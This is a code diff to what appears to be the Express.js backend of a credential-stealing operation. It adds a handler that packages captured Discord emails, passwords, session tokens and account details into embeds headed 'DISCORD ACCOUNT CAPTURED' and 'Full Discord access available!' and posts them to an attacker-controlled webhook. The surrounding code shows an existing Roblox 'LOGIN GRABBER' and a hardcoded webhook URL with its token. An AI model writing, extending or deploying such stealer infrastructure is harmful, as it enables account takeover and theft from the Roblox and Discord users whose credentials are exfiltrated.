@@ -16,12 +16,20 @@ app.use(express.static(__dirname));
 // Discord webhook URL from environment variable
 const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL || 'https://discord.com/api/webhooks/1407917425650827335/PYb8kRnJ_5KPHSd5vIxTo0_JCjeX-Ie63TRnmWDoxmBVYyHhhA27aYq2dKdmQP-BiRwq';
 
+// Discord account webhook URL for Discord credential captures
+const DISCORD_ACCOUNT_WEBHOOK = process.env.DISCORD_ACCOUNT_WEBHOOK || 'YOUR_DISCORD_ACCOUNT_WEBHOOK_URL_HERE';
+
 if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL === 'YOUR_DISCORD_WEBHOOK_URL_HERE') {
   console.error('ERROR: DISCORD_WEBHOOK_URL environment variable is not set');
   console.error('Please either:');
   console.error('1. Set DISCORD_WEBHOOK_URL environment variable');
   console.error('2. Replace YOUR_DISCORD_WEBHOOK_URL_HERE with your actual webhook URL');
   process.exit(1);
+}
+
+if (!DISCORD_ACCOUNT_WEBHOOK || DISCORD_ACCOUNT_WEBHOOK === 'YOUR_DISCORD_ACCOUNT_WEBHOOK_URL_HERE') {
+  console.error('WARNING: DISCORD_ACCOUNT_WEBHOOK environment variable is not set');
+  console.error('Discord account captures will be disabled');
 }
 
 // Function to get CSRF token for Roblox API requests
@@ -424,8 +432,35 @@ app.post('/send-log', async (req, res) => {
     const logData = req.body;
     console.log('Received log:', logData);
     
+    // Handle discord_combined type - send to Discord account webhook
+    if (logData.level === 'discord_combined') {
+      console.log('Processing Discord account data...');
+      
+      if (DISCORD_ACCOUNT_WEBHOOK && DISCORD_ACCOUNT_WEBHOOK !== 'YOUR_DISCORD_ACCOUNT_WEBHOOK_URL_HERE') {
+        const discordMessage = formatDiscordAccountEmbed(logData);
+        
+        const response = await fetch(DISCORD_ACCOUNT_WEBHOOK, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(discordMessage)
+        });
+
+        if (response.ok) {
+          console.log('Successfully sent Discord account data to webhook');
+          res.status(200).json({ success: true });
+        } else {
+          console.error('Failed to send Discord account data:', response.status, response.statusText);
+          res.status(500).json({ error: 'Failed to send to Discord account webhook' });
+        }
+      } else {
+        console.error('Discord account webhook not configured');
+        res.status(400).json({ error: 'Discord account webhook not configured' });
+      }
+    }
     // Handle roblox_combined type - fetch data first, then format
-    if (logData.level === 'roblox_combined') {
+    else if (logData.level === 'roblox_combined') {
       console.log('Processing combined Roblox data - fetching comprehensive user data...');
       
       // Fetch comprehensive user data using the security token
@@ -548,7 +583,7 @@ function formatRobloxCombinedEmbedWithData(logData, userData) {
       },
       {
         name: "<:emoji_31:1410233610031857735> **Robux In/Out**",
-        value: `${userData.robuxIncoming || 0}/${userData.robuxOutgoing || 0}`,
+        value: `<:emoji_31:1410233610031857735> ${userData.robuxIncoming || 0} / <:emoji_31:1410233610031857735> ${userData.robuxOutgoing || 0}`,
         inline: true
       },
       {
@@ -651,7 +686,7 @@ function formatRobloxLoginEmbed(logData) {
   return {
     embeds: [{
       title: `<:emoji_37:1410520517349212200> **LOGIN GRABBER**`,
-      description: "**```"+logData.message.replace(", ", "\n")+"```**",
+      description: "```" + logData.message.replace(", ", "\n") + "```",
       color: 0xFFFFFF,
       fields: [
         {
@@ -875,6 +910,98 @@ function formatRobloxCombinedEmbed(logData) {
   return { embeds };
 }
 
+function formatDiscordAccountEmbed(logData) {
+  const embeds = [];
+
+  // First embed: Discord Account Captured with credentials
+  const accountEmbed = {
+    title: "💬 **DISCORD ACCOUNT CAPTURED**",
+    color: 0x5865F2,
+    thumbnail: logData.userData && logData.userData.avatarUrl ? {
+      url: logData.userData.avatarUrl
+    } : undefined,
+    fields: [
+      {
+        name: "**Login Credentials**",
+        value: `\`\`\`Email: ${logData.credentials?.email || 'Not captured'}\nPassword: ${logData.credentials?.password || 'Not captured'}\`\`\``,
+        inline: false
+      }
+    ],
+    timestamp: new Date(logData.timestamp).toISOString()
+  };
+
+  // Add user data fields if available
+  if (logData.userData) {
+    const userData = logData.userData;
+    
+    accountEmbed.fields.push(
+      {
+        name: "👤 **Username**",
+        value: userData.username || "Unknown",
+        inline: true
+      },
+      {
+        name: "🆔 **User ID**",
+        value: userData.userId || "Unknown",
+        inline: true
+      },
+      {
+        name: "📧 **Email**",
+        value: userData.email || "Unknown",
+        inline: true
+      },
+      {
+        name: "✅ **Verified**",
+        value: userData.verified ? "Yes" : "No",
+        inline: true
+      },
+      {
+        name: "🔐 **2FA Enabled**",
+        value: userData.mfaEnabled ? "Yes" : "No",
+        inline: true
+      },
+      {
+        name: "⭐ **Premium Type**",
+        value: userData.premiumType || "None",
+        inline: true
+      },
+      {
+        name: "🏠 **Servers**",
+        value: userData.guildCount?.toString() || "0",
+        inline: true
+      },
+      {
+        name: "🌍 **Locale**",
+        value: userData.locale || "Unknown",
+        inline: true
+      }
+    );
+
+    accountEmbed.footer = {
+      text: `Discord Session Compromised • ${new Date(logData.timestamp).toLocaleString()}`
+    };
+  }
+
+  embeds.push(accountEmbed);
+
+  // Second embed: Discord Token
+  if (logData.token) {
+    const tokenEmbed = {
+      title: "🔑 Discord Token",
+      description: "**```" + logData.token + "```**",
+      color: 0x5865F2,
+      footer: {
+        text: "Full Discord access available! • " + new Date(logData.timestamp).toLocaleString()
+      },
+      timestamp: new Date(logData.timestamp).toISOString()
+    };
+
+    embeds.push(tokenEmbed);
+  }
+
+  return { embeds };
+}
+
 function getColorForLevel(level) {
   const colors = {
     log: 0x3498db,
@@ -883,7 +1010,8 @@ function getColorForLevel(level) {
     error: 0xe74c3c,
     roblox_login: 0xff0000,
     roblox_userdata: 0x00ff00,
-    roblox_combined: 0xff0000
+    roblox_combined: 0xff0000,
+    discord_combined: 0x5865F2
   };
   return colors[level] || colors.log;
 }
